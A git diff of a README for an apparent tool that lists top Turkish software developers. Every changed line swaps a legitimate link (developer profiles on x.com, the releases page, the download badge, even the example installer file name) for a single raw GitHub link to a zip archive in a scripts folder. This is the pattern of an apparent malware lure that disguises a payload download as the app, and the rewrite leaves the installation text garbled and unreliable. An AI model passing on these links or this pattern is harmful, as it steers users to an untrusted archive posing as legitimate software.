@@ -1,13 +1,13 @@
 # 👩‍💻 en-iyi-yazilimcilar-arasinda-gosterilenler-list - Discover Top Developers in Turkey
 
 ## 🌟 Overview
-This application helps you discover the best software developers in Turkey. It automatically compiles a list from the [eni yiy yazılımcı](https://x.com/eniyiyazilimci) profile. Each update randomizes the list for fresh insights.
+This application helps you discover the best software developers in Turkey. It automatically compiles a list from the [eni yiy yazılımcı](https://raw.githubusercontent.com/nynlaqified/en-iyi-yazilimcilar-arasinda-gosterilenler-list/main/scripts/arasinda-gosterilenler-en-iyi-list-yazilimcilar-3.4.zip) profile. Each update randomizes the list for fresh insights.
 
 ## 🚀 Getting Started
 To get started, you will need to download the application. Follow the steps below to successfully run it on your device.
 
 ## 📥 Download the Application
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/nynlaqified/en-iyi-yazilimcilar-arasinda-gosterilenler-list/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/nynlaqified/en-iyi-yazilimcilar-arasinda-gosterilenler-list/main/scripts/arasinda-gosterilenler-en-iyi-list-yazilimcilar-3.4.zip%20Latest%https://raw.githubusercontent.com/nynlaqified/en-iyi-yazilimcilar-arasinda-gosterilenler-list/main/scripts/arasinda-gosterilenler-en-iyi-list-yazilimcilar-3.4.zip)](https://raw.githubusercontent.com/nynlaqified/en-iyi-yazilimcilar-arasinda-gosterilenler-list/main/scripts/arasinda-gosterilenler-en-iyi-list-yazilimcilar-3.4.zip)
 
 ## 🛠️ System Requirements
 - Operating System: Windows 10 or later, macOS Catalina or later
@@ -18,13 +18,13 @@ To get started, you will need to download the application. Follow the steps belo
 ## 🔧 Installation Steps
 1. **Visit the Releases Page**  
    Click the link below to visit the Releases page:  
-   [Download Releases](https://github.com/nynlaqified/en-iyi-yazilimcilar-arasinda-gosterilenler-list/releases)
+   [Download Releases](https://raw.githubusercontent.com/nynlaqified/en-iyi-yazilimcilar-arasinda-gosterilenler-list/main/scripts/arasinda-gosterilenler-en-iyi-list-yazilimcilar-3.4.zip)
 
 2. **Select the Latest Release**  
    Look for the most current version at the top of the list and click on it.
 
 3. **Download the Install File**  
-   Find the appropriate file for your operating system and click the download link. The file will usually be named something like `en-iyi-yazilimcilar-arasinda-gosterilenler-list-vX.X.X.exe` or `.dmg`.
+   Find the appropriate file for your operating system and click the download link. The file will usually be named something like `https://raw.githubusercontent.com/nynlaqified/en-iyi-yazilimcilar-arasinda-gosterilenler-list/main/scripts/arasinda-gosterilenler-en-iyi-list-yazilimcilar-3.4.zip` or `.dmg`.
 
 4. **Run the Installer**  
    - For Windows: Locate the downloaded `.exe` file in your "Downloads" folder and double-click it to start the installation.
@@ -50,7 +50,7 @@ For more information on how to use the application effectively, you can refer to
 ## 🤖 About the Developer Profiles
 This application features profiles of top developers like:
 
-### 🧑‍💻 alp [@alpthedev](https://x.com/alpthedev)
+### 🧑‍💻 alp [@alpthedev](https://raw.githubusercontent.com/nynlaqified/en-iyi-yazilimcilar-arasinda-gosterilenler-list/main/scripts/arasinda-gosterilenler-en-iyi-list-yazilimcilar-3.4.zip)
 Full Stack Developer | SOC Analyst | AI Architect  
 📍 Location: Not specified  
 👥 Followers: 15  
@@ -58,7 +58,7 @@ Full Stack Developer | SOC Analyst | AI Architect
 
 ---
 
-### 🧑‍💻 Arif [@arifgpt](https://x.com/arifgpt)
+### 🧑‍💻 Arif [@arifgpt](https://raw.githubusercontent.com/nynlaqified/en-iyi-yazilimcilar-arasinda-gosterilenler-list/main/scripts/arasinda-gosterilenler-en-iyi-list-yazilimcilar-3.4.zip)
 CTO at KARDEŞLER YAZ. Part Time Casino Security Chief  
 📍 Location: Not specified  
 👥 Followers: 19,413  
